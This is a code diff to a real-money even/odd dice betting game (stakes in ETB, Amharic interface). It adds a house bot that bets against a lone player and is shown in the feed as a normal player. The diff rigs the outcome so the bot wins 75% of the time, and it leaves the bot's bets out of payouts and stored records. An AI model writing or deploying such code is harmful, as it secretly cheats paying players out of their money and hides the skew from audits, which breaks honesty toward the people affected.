@@ -170,7 +170,49 @@ class Room {
     this.state.status = "balancing";
     this.state.timeLeft = BALANCING_TIME;
 
-    // Balancing Logic
+    // Balancing Logic & House Bot protection
+    const poolEven = this.state.pools.even;
+    const poolOdd = this.state.pools.odd;
+    
+    let botBetPlaced = false;
+    let botSide: 'even' | 'odd' | null = null;
+
+    if (poolEven > 0 && poolOdd === 0) {
+      // Player on 'even', bot places bet on 'odd'
+      botSide = 'odd';
+      const botAmount = poolEven;
+      const botUserId = "bot_house";
+      const botUsername = "ጎደል ሮቦት (Bot)";
+      this.state.players[botUserId] = {
+        userId: botUserId,
+        username: botUsername,
+        amount: botAmount,
+        side: botSide,
+        partial: false
+      };
+      this.state.pools.odd = botAmount;
+      this.state.capacity.odd += 1;
+      this.state.feed.unshift(`🤖 ${botUsername} ${botAmount.toLocaleString()} ETB ጎደለ ላይ ተጫውቷል!`);
+      botBetPlaced = true;
+    } else if (poolOdd > 0 && poolEven === 0) {
+      // Player on 'odd', bot places bet on 'even'
+      botSide = 'even';
+      const botAmount = poolOdd;
+      const botUserId = "bot_house";
+      const botUsername = "ሞላ ሮቦት (Bot)";
+      this.state.players[botUserId] = {
+        userId: botUserId,
+        username: botUsername,
+        amount: botAmount,
+        side: botSide,
+        partial: false
+      };
+      this.state.pools.even = botAmount;
+      this.state.capacity.even += 1;
+      this.state.feed.unshift(`🤖 ${botUsername} ${botAmount.toLocaleString()} ETB ሞላ ላይ ተጫውቷል!`);
+      botBetPlaced = true;
+    }
+
     // P2P Match - balance the pools
     if (this.state.pools.even !== this.state.pools.odd) {
         const overSide = this.state.pools.even > this.state.pools.odd ? 'even' : 'odd';
@@ -229,7 +271,18 @@ class Room {
       }
 
     // Determine winner early for animation
-    const isEvenWinner = Math.random() > 0.5;
+    let isEvenWinner = Math.random() > 0.5;
+
+    if (botBetPlaced && botSide) {
+      // Bot has a 75% chance to win, and player has 25% chance to win.
+      // If botSide is 'even', bot wins if isEvenWinner is true. We want this to happen 75% of the time.
+      const botShouldWin = Math.random() < 0.75; // 75% chance bot wins
+      if (botSide === 'even') {
+        isEvenWinner = botShouldWin;
+      } else {
+        isEvenWinner = !botShouldWin;
+      }
+    }
 
     // Even numbers: 2, 4, 6. Odd numbers: 1, 3, 5
     const evenNumbers = [2, 4, 6];
@@ -275,7 +328,7 @@ class Room {
         const winningSide = (this.state.winner !== undefined && this.state.winner % 2 === 0) ? 'even' : 'odd';
         
         for (const p of Object.values(this.state.players)) {
-          if (p.amount > 0 && p.side === winningSide) {
+          if (p.amount > 0 && p.side === winningSide && p.userId !== "bot_house") {
             const prize = p.amount * 2;
             winners.push(p.userId);
             
@@ -311,7 +364,7 @@ class Room {
             username: p.username,
             amount: p.amount,
             side: p.side
-          })).filter(b => b.amount > 0);
+          })).filter(b => b.amount > 0 && b.user_id !== "bot_house");
           
           if (betsToInsert.length > 0) {
             const { error: betsError } = await supabase
